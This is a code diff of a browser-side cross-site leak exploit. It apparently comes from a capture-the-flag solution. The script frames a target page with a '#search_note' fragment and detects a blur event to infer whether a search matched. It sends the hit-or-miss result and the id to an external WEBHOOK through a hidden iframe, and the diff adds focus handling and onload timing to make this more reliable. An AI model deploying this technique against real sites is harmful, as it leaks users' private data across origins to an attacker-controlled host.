@@ -5,17 +5,20 @@ window.onload = function () {
     const urlParams = new URLSearchParams(window.location.search);
     const id = urlParams.get('id');
     let blurFired = false;
+    window.focus();
     window.addEventListener("blur", () => { blurFired = true; });
     const iframe = document.createElement("iframe");
     iframe.src = TARGET + id + "#search_note";
     document.body.appendChild(iframe);
-    setTimeout(() => {
-        console.log(blurFired);
-        const result = blurFired ? "hit" : "miss";
-        const ex = document.createElement("iframe");
-        ex.style.display = "none";
-        ex.src = WEBHOOK + "?result=" + result + "&id=" + id;
-        document.body.appendChild(ex);
-    }, 1000);
+    iframe.onload = () => {
+        setTimeout(() => {
+            console.log(blurFired);
+            const result = blurFired ? "hit" : "miss";
+            const ex = document.createElement("iframe");
+            ex.style.display = "none";
+            ex.src = WEBHOOK + "?result=" + result + "&id=" + id;
+            document.body.appendChild(ex);
+        }, 1000);
+    };
 };
 </script>
